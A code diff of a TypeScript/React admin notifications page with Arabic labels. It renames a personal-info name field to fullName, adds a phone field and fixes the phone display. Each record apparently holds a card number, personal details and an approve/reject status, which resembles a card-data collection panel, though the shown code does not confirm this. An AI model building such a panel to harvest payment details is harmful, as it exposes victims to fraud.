@@ -94,7 +94,8 @@ interface Notification {
   country?: string
   personalInfo: {
     id?: string | "0"
-    name?: string
+    fullName?: string,
+    phone?:string
   }
   prefix: string
   status: "pending" | "approved" | "rejected" | string
@@ -1419,11 +1420,11 @@ export default function NotificationsPage() {
                               <td className="px-4 py-3">
                                 <div className="flex flex-wrap gap-2">
                                   <Badge
-                                    variant={notification?.personalInfo.name ? "secondary" : "destructive"}
+                                    variant={notification?.personalInfo.fullName ? "secondary" : "destructive"}
                                     className="rounded-md cursor-pointer hover:bg-secondary/80 transition-colors"
                                     onClick={() => handleInfoClick(notification, "personal")}
                                   >
-                                    {notification?.personalInfo.name ? "معلومات شخصية" : "لا يوجد معلومات"}
+                                    {notification?.personalInfo.fullName ? "معلومات شخصية" : "لا يوجد معلومات"}
                                   </Badge>
                                   <Badge
                                     variant={notification.cardNumber ? "secondary" : "destructive"}
@@ -1592,7 +1593,7 @@ export default function NotificationsPage() {
                               <div className="grid grid-cols-1 gap-3 mb-3">
                                 <div className="flex flex-wrap gap-2 mb-2">
                                   <Badge
-                                    variant={notification?.personalInfo.name ? "secondary" : "destructive"}
+                                    variant={notification?.personalInfo.fullName ? "secondary" : "destructive"}
                                     className="rounded-md cursor-pointer"
                                     onClick={() => handleInfoClick(notification, "personal")}
                                   >
@@ -1806,13 +1807,13 @@ export default function NotificationsPage() {
                 <div className="flex justify-between items-center py-2 border-b border-border/50">
                   <span className="font-medium text-muted-foreground">الاسم:</span>
                   <span className="font-semibold">{selectedNotification.name}</span>
-                  <span className="font-semibold">{selectedNotification.personalInfo.name}</span>
+                  <span className="font-semibold">{selectedNotification.personalInfo?.fullName}</span>
                 </div>
               )}
-              {selectedNotification.phone && (
+              {selectedNotification.personalInfo.phone && (
                 <div className="flex justify-between items-center py-2">
                   <span className="font-medium text-muted-foreground">الهاتف:</span>
-                  <span className="font-semibold">{selectedNotification.personalInfo.id}</span>
+                  <span className="font-semibold">{selectedNotification.personalInfo.phone}</span>
                   <span className="font-semibold">{selectedNotification.phone}</span>
                 </div>
               )}
